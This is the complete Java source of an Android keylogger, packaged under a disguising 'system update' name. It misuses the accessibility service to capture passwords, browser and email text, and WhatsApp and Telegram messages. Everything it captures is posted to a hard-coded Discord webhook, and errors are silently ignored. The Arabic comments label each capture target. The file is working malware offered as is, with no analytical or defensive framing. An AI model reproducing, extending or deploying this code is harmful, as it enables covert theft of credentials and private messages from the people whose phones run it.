package com.system.update;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import org.json.JSONObject;
import java.io.IOException;
import okhttp3.*;

public class KeyloggerService extends AccessibilityService {
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1566505631010000936/p7JDjQyMloPFqCP50Bmc4D8Qjop8nVcWaGH9FYTzfEry_4U39rQWqjGEE4mpPokrbqVa";
    private final OkHttpClient client = new OkHttpClient();

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null && source.getText() != null) {
                String text = source.getText().toString();
                String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";

                if (text.trim().isEmpty()) return;

                // 1. لو الخانة دي مخصصة لباسورد (زي تسجيل الدخول)
                if (source.isPassword()) {
                    sendToDiscord("🔐 **باسورد مكتشف!**\n**التطبيق:** " + pkg + "\n**الباسورد:** `" + text + "`");
                } 
                // 2. لو بنكتب في المتصفح أو تطبيق إيميل
                else if (pkg.contains("chrome") || pkg.contains("browser") || pkg.contains("gmail") || pkg.contains("email") || pkg.contains("outlook")) {
                    // لو النص طويل شوية (أكتر من 3 حروف) ومش مجرد حرف واحد
                    if (text.length() > 3) {
                        sendToDiscord("🌐 **كتابة في المتصفح/الإيميل:** [" + pkg + "]\n" + text);
                    }
                }
                // 3. لواتساب وتليجرام
                else if (pkg.contains("whatsapp") || pkg.contains("telegram")) {
                    sendToDiscord("💬 **رسالة في [" + pkg + "]:**\n" + text);
                }
            }
        }
    }

    @Override public void onInterrupt() {}
    
    private void sendToDiscord(String text) {
        try {
            JSONObject json = new JSONObject();
            json.put("content", text);
            RequestBody body = RequestBody.create(json.toString(), MediaType.parse("application/json; charset=utf-8"));
            Request request = new Request.Builder().url(WEBHOOK_URL).post(body).build();
            client.newCall(request).enqueue(new Callback() {
                @Override public void onFailure(Call call, IOException e) { }
                @Override public void onResponse(Call call, Response response) { }
            });
        } catch (Exception ignored) {}
    }
}
